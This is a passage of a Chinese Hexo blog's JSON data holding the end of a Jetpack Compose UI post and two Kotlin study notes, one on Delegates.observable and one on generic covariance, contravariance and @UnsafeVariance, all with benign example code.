<span class=\"token string\">\"拉取请求\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF11ABF1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_git_repository_line<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"仓库\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF8811F1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_organization<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"组织\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFFF18C11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">Divider</span><span class=\"token punctuation\">(</span>\n                    color <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>Gray<span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                        Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>vertical <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                            text <span class=\"token operator\">=</span> <span class=\"token string\">\"收藏夹\"</span><span class=\"token punctuation\">,</span>\n                            style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                                fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>bottom <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                        <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                            text <span class=\"token operator\">=</span> <span class=\"token string\">\"将仓库加入收藏夹以便随时快速访问，而无需搜索\"</span><span class=\"token punctuation\">,</span>\n                            style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                        <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                            modifier <span class=\"token operator\">=</span> Modifier\n                                <span class=\"token punctuation\">.</span><span class=\"token function\">fillMaxWidth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            horizontalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterHorizontally\n                        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                            <span class=\"token function\">Card</span><span class=\"token punctuation\">(</span>\n                                modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>horizontal <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n                            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                                <span class=\"token function\">Button</span><span class=\"token punctuation\">(</span>\n                                    onClick <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">/*TODO*/</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                                    elevation <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">fillMaxWidth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    colors <span class=\"token operator\">=</span> ButtonDefaults<span class=\"token punctuation\">.</span><span class=\"token function\">buttonColors</span><span class=\"token punctuation\">(</span>\n                                        backgroundColor <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>Transparent\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                                    <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                                        text <span class=\"token operator\">=</span> <span class=\"token string\">\"添加收藏\"</span><span class=\"token punctuation\">,</span>\n                                        style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                            fontSize <span class=\"token operator\">=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">.</span>sp<span class=\"token punctuation\">,</span>\n                                            color <span class=\"token operator\">=</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF229DD5</span><span class=\"token punctuation\">)</span>\n                                        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                        modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">&#125;</span>\n                            <span class=\"token punctuation\">&#125;</span>\n                        <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>\n        icon<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        text<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        color<span class=\"token operator\">:</span> Color\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Row</span><span class=\"token punctuation\">(</span>\n            Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>vertical <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            verticalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterVertically\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// 圆角icon</span>\n            <span class=\"token function\">Surface</span><span class=\"token punctuation\">(</span>\n                shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>end <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">Image</span><span class=\"token punctuation\">(</span>\n                    painter <span class=\"token operator\">=</span> <span class=\"token function\">painterResource</span><span class=\"token punctuation\">(</span>id <span class=\"token operator\">=</span> icon<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier\n                        <span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">.</span><span class=\"token function\">background</span><span class=\"token punctuation\">(</span>color<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    colorFilter <span class=\"token operator\">=</span> ColorFilter<span class=\"token punctuation\">.</span><span class=\"token function\">tint</span><span class=\"token punctuation\">(</span>Color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                text <span class=\"token operator\">=</span> text<span class=\"token punctuation\">,</span>\n                style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                    fontSize <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">.</span>sp\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation builtin\">@Preview</span>\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">Preview</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h2><p>感觉还行，学习一上午Compose的成果</p>\n<p><img src=\"https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg\"></p>\n"},{"title":"利用Kotlin委托快捷的创建可观察属性","date":"2021-12-17T16:00:00.000Z","author":"寒雨","hide":false,"summary":"所以LiveData被时代抛弃的理由又多了一个","_content":"\n# 利用Kotlin委托快捷的创建可观察属性\n\n废话少说，上代码\n\n~~~kotlin\nclass User {\n    var name: String by Delegates.observable(\"初始值\") { prop, old, new ->\n        println(\"旧值：$old -> 新值：$new\")\n    }\n}\n~~~\n\n但不同于RxJava，Flow和LiveData，它只能在变量声明时指定观察的回调函数\n\n这也使得它不能在功能上完全取代掉LiveData（没错，我是标题党），尤其是在MVVM这种分层架构的架构模式中\n\n但这不妨碍它成为LiveData被时代抛弃的理由之一，毕竟它可是Kotlin原生库里的东西。如果不需要在变量声明之后指定回调函数，那什么RxJava，Flow都得靠边站了。","source":"_posts/kotlin-delegates-observable.md","raw":"---\ntitle: 利用Kotlin委托快捷的创建可观察属性\ndate: 2021-12-18\nauthor: 寒雨\nhide: false\nsummary: 所以LiveData被时代抛弃的理由又多了一个\ncategories: 笔记\ntags:\n  - Kotlin\n  - 委托\n---\n\n# 利用Kotlin委托快捷的创建可观察属性\n\n废话少说，上代码\n\n~~~kotlin\nclass User {\n    var name: String by Delegates.observable(\"初始值\") { prop, old, new ->\n        println(\"旧值：$old -> 新值：$new\")\n    }\n}\n~~~\n\n但不同于RxJava，Flow和LiveData，它只能在变量声明时指定观察的回调函数\n\n这也使得它不能在功能上完全取代掉LiveData（没错，我是标题党），尤其是在MVVM这种分层架构的架构模式中\n\n但这不妨碍它成为LiveData被时代抛弃的理由之一，毕竟它可是Kotlin原生库里的东西。如果不需要在变量声明之后指定回调函数，那什么RxJava，Flow都得靠边站了。","slug":"kotlin-delegates-observable","published":1,"updated":"2022-11-24T02:56:35.966Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtn001qsfkl05h6fhhk","content":"<h1 id=\"利用Kotlin委托快捷的创建可观察属性\"><a href=\"#利用Kotlin委托快捷的创建可观察属性\" class=\"headerlink\" title=\"利用Kotlin委托快捷的创建可观察属性\"></a>利用Kotlin委托快捷的创建可观察属性</h1><p>废话少说，上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> User <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> name<span class=\"token operator\">:</span> String <span class=\"token keyword\">by</span> Delegates<span class=\"token punctuation\">.</span><span class=\"token function\">observable</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"初始值\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> prop<span class=\"token punctuation\">,</span> old<span class=\"token punctuation\">,</span> new <span class=\"token operator\">-&gt;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"旧值：<span class=\"token interpolation variable\">$old</span> -&gt; 新值：<span class=\"token interpolation variable\">$new</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但不同于RxJava，Flow和LiveData，它只能在变量声明时指定观察的回调函数</p>\n<p>这也使得它不能在功能上完全取代掉LiveData（没错，我是标题党），尤其是在MVVM这种分层架构的架构模式中</p>\n<p>但这不妨碍它成为LiveData被时代抛弃的理由之一，毕竟它可是Kotlin原生库里的东西。如果不需要在变量声明之后指定回调函数，那什么RxJava，Flow都得靠边站了。</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"利用Kotlin委托快捷的创建可观察属性\"><a href=\"#利用Kotlin委托快捷的创建可观察属性\" class=\"headerlink\" title=\"利用Kotlin委托快捷的创建可观察属性\"></a>利用Kotlin委托快捷的创建可观察属性</h1><p>废话少说，上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> User <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> name<span class=\"token operator\">:</span> String <span class=\"token keyword\">by</span> Delegates<span class=\"token punctuation\">.</span><span class=\"token function\">observable</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"初始值\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> prop<span class=\"token punctuation\">,</span> old<span class=\"token punctuation\">,</span> new <span class=\"token operator\">-></span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"旧值：<span class=\"token interpolation variable\">$old</span> -> 新值：<span class=\"token interpolation variable\">$new</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但不同于RxJava，Flow和LiveData，它只能在变量声明时指定观察的回调函数</p>\n<p>这也使得它不能在功能上完全取代掉LiveData（没错，我是标题党），尤其是在MVVM这种分层架构的架构模式中</p>\n<p>但这不妨碍它成为LiveData被时代抛弃的理由之一，毕竟它可是Kotlin原生库里的东西。如果不需要在变量声明之后指定回调函数，那什么RxJava，Flow都得靠边站了。</p>\n"},{"title":"Kotlin 泛型协变/逆变学习笔记","date":"2021-11-12T16:00:00.000Z","author":"寒雨","hide":false,"summary":"Kotlin协变/逆变笔记","_content":"\n# Kotlin 泛型协变/逆变学习笔记\n\n## 协变\n\n### 我的理解\n\n设想以下情况: Student是Person的子类\n\n我们定义了一个Data\\<T>(val data: T)作为容器来存放他们\n\n函数test接受一个类型为Data\\<Person>的参数,我们手上有一个类型为Data\\<Student>的实例\n\n我们理所当然的把它作为参数传入test函数，却发现编译无法通过\n\n这时你傻眼了，原来Data\\<Student>跟本无法作为一个Data\\<Person>的参数传入函数，也就是没法隐式向下转型\n\n但我们发现，使用List这样的容器是允许这样做的\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\nclass Data<T>(val data: T)\n\nfun test(people: List<Person>) {\n    TODO()\n}\n\nfun test(people: Data<Person>) {\n    TODO()\n}\n\nfun main() {\n    val studentList = arrayListOf(\n        Student(\"xxx\", 6),\n        Student(\"xxx\", 6)\n    )\n    val data = Data(Student(\"xxx\", 6))\n    test(data) // 编译不能通过\n    test(studentList) // 编译可以通过\n}\n~~~\n\n\n\n这是因为List这个类型用到了泛型的协变，这类问题我们应该使用泛型的协变来处理\n\n实际上Java为了杜绝安全隐患，是不允许这样传递参数的。换句话说，即使 Student是Person的子类，SimpleData并不是SimpleData的子 类。\n\n但稍作思考，像crossinline那样，我们可以做一个约定来避免类型转换的安全隐患。如果我们约定泛型T是只读的话（也就是不能改变)，也就能避免类型转换的安全隐患，但那样就意味着我们这个类的参数中不能含有泛型。这样持有泛型的类型便会拥有泛型类型的继承关系。\n\n这里引用一下《第一行代码: 第三版》中对泛型协变的定义\n\n> 假如定义了一个MyClass的泛型类，其中A 是B的子类型，同时MyClass<A>又是MyClass<B>的子类型，那么我们就可以称MyClass在T这个泛型上是协变的。\n\n### 屁话多！如何使用\n\n只需要在声明泛型时在前面加上out修饰符即可，之后你便需要遵守协变的约定\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\n// 声明泛型时在前面加个out即可规定这个类在这个泛型上是协变的\nclass Data<out T>(val data: T) {\n\n    // 不合法，因为外部可以访问并修改这个变量\n    // 编译不通过\n    var value: T = TODO()\n    // 合法，外部无法访问这个变量\n    private var value2: T = TODO()\n    // 合法，因为这是常量，常量值无法被修改\n    val value3: T = TODO()\n\n    // 不合法，因为协变规定了不能在方法参数中使用泛型\n    // 编译不通过\n    fun func(input: T) {\n        TODO()\n    }\n\n    // 这样做是合法的，方法的返回值可以使用泛型\n    fun func(): T {\n        TODO()\n    }\n}\n\nfun test(people: List<Person>) {\n    TODO()\n}\n\nfun test(people: Data<Person>) {\n    TODO()\n}\n\nfun main() {\n    val studentList = arrayListOf(\n        Student(\"xxx\", 6),\n        Student(\"xxx\", 6)\n    )\n    val data = Data(Student(\"xxx\", 6))\n    test(data) // 使用协变后 编译通过\n    test(studentList) // 编译可以通过\n}\n~~~\n\n## 逆变\n\n协变让我们可以将Data\\<Student>隐式向上转型变成Data\\<Person>\n\n那么逆变自然是让我们可以向下转型，并且它是隐式的\n\n只要我们约定泛型不会在返回值中使用，就可以让持有泛型的类**隐式的**向下转型 (隐式的向上转型意味着这可能不会像协变那样安全)\n\n### 使用示例\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\n\ninterface Transformer<in T> {\n    fun transform(t: T): String\n}\n\nfun main() {\n    val trans = object : Transformer<Person> {\n        override fun transform(t: Person): String {\n            return t.name\n        }\n    }\n    handleTransformer(trans) // 如果不声明逆变 这行代码无法通过编译\n}\n\nfun handleTransformer(trans: Transformer<Student>) {\n    val student = Student(\"Tom\", 6)\n    val result = trans.transform(student)\n}\n\n~~~\n\n\n\n## @UnsafeVariance注解\n\n在你违反了协变/逆变的约定时，可以使用这个注解让编译通过\n\n但正如它的字面意思，**它不安全**\n\n在迫不得已要使用它的情况下，你必须清楚你在做什么\n\n### 使用示例\n\n~~~kotlin\nclass Data<out T>(val data: T) {\n\n    // 不合法，因为外部可以访问并修改这个变量\n    // 使用@UnsafeVariance注解，编译通过\n    var value: @UnsafeVariance T = TODO()\n    // 合法，外部无法访问这个变量\n    private var value2: T = TODO()\n    // 合法，因为这是常量，常量值无法被修改\n    val value3: T = TODO()\n\n    // 不合法，因为协变规定了不能在方法参数中使用泛型\n    // 使用@UnsafeVariance注解，编译通过\n    fun func(input: @UnsafeVariance T) {\n        TODO()\n    }\n\n    // 这样做是合法的，方法的返回值可以使用泛型\n    fun func(): T {\n        TODO()\n    }\n}\n~~~\n\n\n\n","source":"_posts/kotlin-generics-covariation-and-inversion.md","raw":"---\ntitle: Kotlin 泛型协变/逆变学习笔记\ndate: 2021-11-13\nauthor: 寒雨\nhide: false\nsummary: Kotlin协变/逆变笔记\ncategories: 笔记\ntags:\n  - Kotlin\n---\n\n# Kotlin 泛型协变/逆变学习笔记\n\n## 协变\n\n### 我的理解\n\n设想以下情况: Student是Person的子类\n\n我们定义了一个Data\\<T>(val data: T)作为容器来存放他们\n\n函数test接受一个类型为Data\\<Person>的参数,我们手上有一个类型为Data\\<Student>的实例\n\n我们理所当然的把它作为参数传入test函数，却发现编译无法通过\n\n这时你傻眼了，原来Data\\<Student>跟本无法作为一个Data\\<Person>的参数传入函数，也就是没法隐式向下转型\n\n但我们发现，使用List这样的容器是允许这样做的\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\nclass Data<T>(val data: T)\n\nfun test(people: List<Person>) {\n    TODO()\n}\n\nfun test(people: Data<Person>) {\n    TODO()\n}\n\nfun main() {\n    val studentList = arrayListOf(\n        Student(\"xxx\", 6),\n        Student(\"xxx\", 6)\n    )\n    val data = Data(Student(\"xxx\", 6))\n    test(data) // 编译不能通过\n    test(studentList) // 编译可以通过\n}\n~~~\n\n\n\n这是因为List这个类型用到了泛型的协变，这类问题我们应该使用泛型的协变来处理\n\n实际上Java为了杜绝安全隐患，是不允许这样传递参数的。换句话说，即使 Student是Person的子类，SimpleData并不是SimpleData的子 类。\n\n但稍作思考，像crossinline那样，我们可以做一个约定来避免类型转换的安全隐患。如果我们约定泛型T是只读的话（也就是不能改变)，也就能避免类型转换的安全隐患，但那样就意味着我们这个类的参数中不能含有泛型。这样持有泛型的类型便会拥有泛型类型的继承关系。\n\n这里引用一下《第一行代码: 第三版》中对泛型协变的定义\n\n> 假如定义了一个MyClass的泛型类，其中A 是B的子类型，同时MyClass<A>又是MyClass<B>的子类型，那么我们就可以称MyClass在T这个泛型上是协变的。\n\n### 屁话多！如何使用\n\n只需要在声明泛型时在前面加上out修饰符即可，之后你便需要遵守协变的约定\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\n// 声明泛型时在前面加个out即可规定这个类在这个泛型上是协变的\nclass Data<out T>(val data: T) {\n\n    // 不合法，因为外部可以访问并修改这个变量\n    // 编译不通过\n    var value: T = TODO()\n    // 合法，外部无法访问这个变量\n    private var value2: T = TODO()\n    // 合法，因为这是常量，常量值无法被修改\n    val value3: T = TODO()\n\n    // 不合法，因为协变规定了不能在方法参数中使用泛型\n    // 编译不通过\n    fun func(input: T) {\n        TODO()\n    }\n\n    // 这样做是合法的，方法的返回值可以使用泛型\n    fun func(): T {\n        TODO()\n    }\n}\n\nfun test(people: List<Person>) {\n    TODO()\n}\n\nfun test(people: Data<Person>) {\n    TODO()\n}\n\nfun main() {\n    val studentList = arrayListOf(\n        Student(\"xxx\", 6),\n        Student(\"xxx\", 6)\n    )\n    val data = Data(Student(\"xxx\", 6))\n    test(data) // 使用协变后 编译通过\n    test(studentList) // 编译可以通过\n}\n~~~\n\n## 逆变\n\n协变让我们可以将Data\\<Student>隐式向上转型变成Data\\<Person>\n\n那么逆变自然是让我们可以向下转型，并且它是隐式的\n\n只要我们约定泛型不会在返回值中使用，就可以让持有泛型的类**隐式的**向下转型 (隐式的向上转型意味着这可能不会像协变那样安全)\n\n### 使用示例\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\n\ninterface Transformer<in T> {\n    fun transform(t: T): String\n}\n\nfun main() {\n    val trans = object : Transformer<Person> {\n        override fun transform(t: Person): String {\n            return t.name\n        }\n    }\n    handleTransformer(trans) // 如果不声明逆变 这行代码无法通过编译\n}\n\nfun handleTransformer(trans: Transformer<Student>) {\n    val student = Student(\"Tom\", 6)\n    val result = trans.transform(student)\n}\n\n~~~\n\n\n\n## @UnsafeVariance注解\n\n在你违反了协变/逆变的约定时，可以使用这个注解让编译通过\n\n但正如它的字面意思，**它不安全**\n\n在迫不得已要使用它的情况下，你必须清楚你在做什么\n\n### 使用示例\n\n~~~kotlin\nclass Data<out T>(val data: T) {\n\n    // 不合法，因为外部可以访问并修改这个变量\n    // 使用@UnsafeVariance注解，编译通过\n    var value: @UnsafeVariance T = TODO()\n    // 合法，外部无法访问这个变量\n    private var value2: T = TODO()\n    // 合法，因为这是常量，常量值无法被修改\n    val value3: T = TODO()\n\n    // 不合法，因为协变规定了不能在方法参数中使用泛型\n    // 使用@UnsafeVariance注解，编译通过\n    fun func(input: @UnsafeVariance T) {\n        TODO()\n    }\n\n    // 这样做是合法的，方法的返回值可以使用泛型\n    fun func(): T {\n        TODO()\n    }\n}\n~~~\n\n\n\n","slug":"kotlin-generics-covariation-and-inversion","published":1,"updated":"2022-11-24T02:52:06.426Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jto001ssfkl54o8fl99","content":"<h1 id=\"Kotlin-泛型协变-x2F-逆变学习笔记\"><a href=\"#Kotlin-泛型协变-x2F-逆变学习笔记\" class=\"headerlink\" title=\"Kotlin 泛型协变/逆变学习笔记\"></a>Kotlin 泛型协变/逆变学习笔记</h1><h2 id=\"协变\"><a href=\"#协变\" class=\"headerlink\" title=\"协变\"></a>协变</h2><h3 id=\"我的理解\"><a href=\"#我的理解\" class=\"headerlink\" title=\"我的理解\"></a>我的理解</h3><p>设想以下情况: Student是Person的子类</p>\n<p>我们定义了一个Data&lt;T&gt;(val data: T)作为容器来存放他们</p>\n<p>函数test接受一个类型为Data&lt;Person&gt;的参数,我们手上有一个类型为Data&lt;Student&gt;的实例</p>\n<p>我们理所当然的把它作为参数传入test函数，却发现编译无法通过</p>\n<p>这时你傻眼了，原来Data&lt;Student&gt;跟本无法作为一个Data&lt;Person&gt;的参数传入函数，也就是没法隐式向下转型</p>\n<p>但我们发现，使用List这样的容器是允许这样做的</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token 